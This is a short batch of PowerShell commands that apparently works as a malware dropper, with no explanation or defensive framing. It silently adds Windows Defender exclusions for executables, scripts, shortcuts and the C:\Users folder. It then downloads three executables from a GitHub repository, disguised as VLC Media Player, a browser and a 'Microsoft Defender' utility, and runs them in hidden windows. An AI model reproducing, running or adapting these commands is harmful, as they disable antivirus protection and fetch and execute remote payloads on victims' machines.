powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/VLC%20Media%20Player.exe -o C:\Users\VLC.exe
powershell.exe -w Hidden C:\Users\VLC.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\Browser.exe
powershell.exe -w Hidden C:\Users\Browser.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
